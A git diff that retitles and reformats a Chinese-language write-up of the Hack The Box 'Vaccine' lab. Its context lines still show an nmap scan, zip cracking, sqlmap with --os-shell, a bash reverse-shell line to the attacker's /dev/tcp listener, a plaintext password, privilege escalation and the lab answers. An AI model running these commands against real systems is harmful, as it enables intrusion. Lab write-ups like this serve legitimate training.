@@ -1,11 +1,9 @@
 ---
-title: Hack the box Vaccine题解
+title: Vaccine
 ---
-# Hack the box Vaccine题解
-
 > 在打靶机的时候网络有点问题，所以这份WP里的目标机器的IP前后是不一样的，但总的来说，方法大同小异
 
-# 扫端口
+## 扫端口
 
 ```shell
 nmap -sC -sV 10.129.252.99
@@ -17,13 +15,13 @@ nmap -sC -sV 10.129.252.99
 
 ![image-20230402131255007](https://alpha-blog-1300014916.cos.ap-guangzhou.myqcloud.com/img/image-20230402131255007.png)
 
-# ftp
+## ftp
 
 连上以后把文件复制出来
 
 ![image-20230402131346467](https://alpha-blog-1300014916.cos.ap-guangzhou.myqcloud.com/img/image-20230402131346467.png)
 
-# 破解zip密码
+## 破解zip密码
 
 解压的时候发现是有密码的
 
@@ -37,7 +35,7 @@ nmap -sC -sV 10.129.252.99
 
 ![image-20230402132032683](https://alpha-blog-1300014916.cos.ap-guangzhou.myqcloud.com/img/image-20230402132032683.png)
 
-# backup的内容
+## backup的内容
 
 得到了两个文件
 
@@ -49,7 +47,7 @@ nmap -sC -sV 10.129.252.99
 
 ![image-20230402132605551](https://alpha-blog-1300014916.cos.ap-guangzhou.myqcloud.com/img/image-20230402132605551.png)
 
-# sql注入
+## sql注入
 
 登录到后台后有个搜索框尝试有无sql注入，发现可注入，加上任务6的提示，那就直接 `sqlmap`一把梭
 
@@ -65,7 +63,7 @@ nmap -sC -sV 10.129.252.99
 sqlmap -r 1.txt --os-shell 
 ```
 
-# 反弹shell
+## 反弹shell
 
 - 攻击机监听
 
@@ -88,7 +86,7 @@ bash -c "bash -i >& /dev/tcp/10.10.14.13/1234 0>&1"
 密码：P@s5w0rd!
 ```
 
-# 提权
+## 提权
 
 在前面的端口扫描里看到这台机器是开启了22端口的，尝试使用上面得到的账号密码去登陆（想要用这个是因为为反弹shell后并不稳定，老是掉线，所以就换另一个方法），可以成功登录![image-20230402224519697](https://alpha-blog-1300014916.cos.ap-guangzhou.myqcloud.com/img/image-20230402224519697.png)
 
@@ -113,7 +111,7 @@ bash -c "bash -i >& /dev/tcp/10.10.14.13/1234 0>&1"
 
 ![image-20230402230044265](https://alpha-blog-1300014916.cos.ap-guangzhou.myqcloud.com/img/image-20230402230044265.png)
 
-# 答案
+## 答案
 
 > 1. FTP
 > 2. anonymous
